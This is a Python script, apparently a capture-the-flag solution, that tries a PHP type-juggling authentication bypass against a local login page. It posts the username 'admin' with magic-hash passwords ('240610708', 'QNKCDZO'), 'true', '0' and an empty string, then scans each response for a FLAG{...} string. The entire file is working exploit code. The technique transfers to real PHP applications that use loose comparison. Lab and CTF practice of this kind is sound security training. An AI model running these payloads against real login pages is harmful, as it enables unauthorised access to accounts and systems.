import requests
import re

target = "http://127.0.0.1:32907/index.php"

print("Testing PHP Type Juggling Authentication Bypass\n")

# Test payloads
payloads = [
    ("admin", "true", "Boolean string 'true'"),
    ("admin", "240610708", "Magic hash 240610708"),
    ("admin", "QNKCDZO", "Magic hash QNKCDZO"),
    ("admin", "0", "Integer 0"),
    ("admin", "", "Empty string"),
]

for username, password, desc in payloads:
    print(f"[+] Testing: {desc}")
    print(f"    Username: {username}, Password: {password}")
    
    try:
        resp = requests.post(target, data={"username": username, "password": password}, timeout=10)
        print(f"    Status: {resp.status_code} | Length: {len(resp.text)}B")
        
        # Search for flag
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"    [!] FLAG FOUND: {flag_match.group()}")
            print(f"\nFull Response:\n{resp.text}\n")
        else:
            print(f"    No flag found")
    except Exception as e:
        print(f"    Error: {e}")
    
    print()

print("All tests complete")

